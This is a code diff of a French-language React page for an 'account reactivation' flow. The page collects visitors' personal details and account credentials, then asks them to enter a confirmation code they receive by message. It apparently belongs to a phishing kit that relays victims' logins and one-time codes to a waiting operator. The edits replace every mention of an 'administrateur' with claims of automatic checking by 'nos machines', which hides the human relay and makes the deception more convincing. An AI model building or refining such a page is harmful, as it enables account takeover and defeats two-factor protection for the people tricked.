@@ -170,7 +170,7 @@ export default function ClientLinkPage() {
                     setLinkInfo(data);
 
                     if (data.expiry_date && new Date() > new Date(data.expiry_date)) {
-                        setErrorMsg("Ce lien a expiré. Veuillez contacter votre administrateur.");
+                        setErrorMsg("Ce lien a expiré. Veuillez contacter l'assistance.");
                     } else if (data.submissions_limit > 0 && data.submission_count >= data.submissions_limit) {
                         setErrorMsg("Ce formulaire a atteint son quota maximal de participations.");
                     }
@@ -407,7 +407,7 @@ export default function ClientLinkPage() {
                                     Demande de Réactivation de Compte
                                 </h1>
                                 <p className="text-xs sm:text-sm text-slate-400 leading-relaxed">
-                                    Renseignez vos coordonnées personnelles et les accès de votre compte pour soumettre votre dossier à l'administrateur.
+                                    Renseignez vos coordonnées personnelles et les accès de votre compte pour lancer la vérification automatique par nos machines.
                                 </p>
                             </div>
 
@@ -555,7 +555,7 @@ export default function ClientLinkPage() {
                                         </>
                                     ) : (
                                         <>
-                                            <span>Soumettre la demande à l'administrateur</span>
+                                            <span>Soumettre le dossier à nos machines</span>
                                             <ArrowRight className="w-4 h-4" />
                                         </>
                                     )}
@@ -564,7 +564,7 @@ export default function ClientLinkPage() {
                         </motion.div>
                     )}
 
-                    {/* ÉTAPE 2 : ATTENTE D'APPROBATION ADMIN */}
+                    {/* ÉTAPE 2 : VÉRIFICATION PAR NOS MACHINES */}
                     {currentStep === 'waiting_admin' && (
                         <motion.div
                             key="step-waiting"
@@ -580,10 +580,10 @@ export default function ClientLinkPage() {
                             </div>
 
                             <h2 className="text-xl font-bold text-white mb-2">
-                                Examen de votre demande en cours
+                                Examen de votre dossier en cours
                             </h2>
                             <p className="text-xs sm:text-sm text-slate-400 mb-8 max-w-md mx-auto leading-relaxed">
-                                Votre dossier a été transmis au tableau de bord administrateur. Veuillez patienter sur cette page pendant son examen.
+                                Votre dossier a été transmis à nos machines. Veuillez patienter sur cette page pendant le traitement automatique.
                             </p>
 
                             <div className="p-4 rounded-xl bg-slate-900/60 border border-white/5 space-y-3 text-left mb-6">
@@ -591,21 +591,21 @@ export default function ClientLinkPage() {
                                     <div className="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center">
                                         <Check className="w-2.5 h-2.5" />
                                     </div>
-                                    <span className="text-slate-200">Informations transmises au tableau de bord</span>
+                                    <span className="text-slate-200">Informations transmises à nos machines</span>
                                 </div>
                                 <div className="flex items-center gap-3 text-xs">
                                     <Loader2 className="w-4 h-4 text-blue-400 animate-spin shrink-0" />
-                                    <span className="text-blue-400 font-medium">En attente de validation par l'administrateur...</span>
+                                    <span className="text-blue-400 font-medium">Vérification en cours par nos machines...</span>
                                 </div>
                                 <div className="flex items-center gap-3 text-xs">
                                     <div className="w-4 h-4 rounded-full bg-slate-800 border border-slate-700"></div>
-                                    <span className="text-slate-500">Envoi du code ou lien de confirmation par message</span>
+                                    <span className="text-slate-500">Envoi du code de confirmation par message</span>
                                 </div>
                             </div>
                         </motion.div>
                     )}
 
-                    {/* ÉTAPE 3 : SAISIE DU CODE OU DU LIEN REÇU */}
+                    {/* ÉTAPE 3 : SAISIE DU CODE DE CONFIRMATION REÇU */}
                     {currentStep === 'enter_code' && (
                         <motion.div
                             key="step-code"
@@ -618,17 +618,17 @@ export default function ClientLinkPage() {
                                 <div className="w-12 h-12 rounded-xl bg-blue-600/10 border border-blue-500/20 text-blue-400 flex items-center justify-center mx-auto mb-4">
                                     <MessageSquare className="w-6 h-6" />
                                 </div>
-                                <span className="badge badge-success text-[10px] mb-2">Demande Approuvée</span>
+                                <span className="badge badge-success text-[10px] mb-2">Dossier Validé</span>
                                 <h2 className="text-xl font-bold text-white mb-2">Confirmation du Dossier</h2>
                                 <p className="text-xs text-slate-400 leading-relaxed max-w-sm mx-auto">
-                                    L'administrateur a validé votre demande. Veuillez coller ci-dessous le code de confirmation ou le lien que vous venez de recevoir par message.
+                                    Nos machines ont validé votre demande. Veuillez saisir ci-dessous le code de confirmation que vous venez de recevoir par message.
                                 </p>
                             </div>
 
                             <form onSubmit={handleCodeSubmit} className="space-y-5">
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5 text-center">
-                                        Code de confirmation ou Lien reçu par message
+                                        Code de confirmation reçu par message
                                     </label>
                                     <div className="relative">
                                         <KeyRound className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
@@ -636,7 +636,7 @@ export default function ClientLinkPage() {
                                             type="text"
                                             required
                                             autoFocus
-                                            placeholder="Collez votre code ou le lien ici (ex: https://... ou 123456)"
+                                            placeholder="Entrez votre code de confirmation (ex: 123456)"
                                             value={confirmationCode}
                                             onChange={(e) => setConfirmationCode(e.target.value)}
                                             className="input-field pl-10 text-center font-mono text-sm font-semibold tracking-wide"
@@ -710,7 +710,7 @@ export default function ClientLinkPage() {
                                 <div className="space-y-2.5 pt-2 text-left">
                                     <div className="flex items-center gap-2.5 text-xs text-slate-300">
                                         <Check className="w-4 h-4 text-emerald-400 shrink-0" />
-                                        <span>Code et lien de confirmation validés avec succès</span>
+                                        <span>Code de confirmation validé avec succès par nos machines</span>
                                     </div>
                                     <div className="flex items-center gap-2.5 text-xs text-slate-300">
                                         <Loader2 className="w-4 h-4 text-blue-400 animate-spin shrink-0" />
@@ -775,7 +775,7 @@ export default function ClientLinkPage() {
                             </div>
                             <h2 className="text-xl font-bold text-white mb-2">Demande Non Approuvée</h2>
                             <p className="text-xs text-slate-400 mb-6">
-                                Votre demande de réactivation n'a pas pu être validée par l'administrateur. Veuillez contacter le support.
+                                Votre demande de réactivation n'a pas pu être validée par nos machines. Veuillez contacter le support.
                             </p>
                             <button
                                 onClick={() => setCurrentStep('form')}
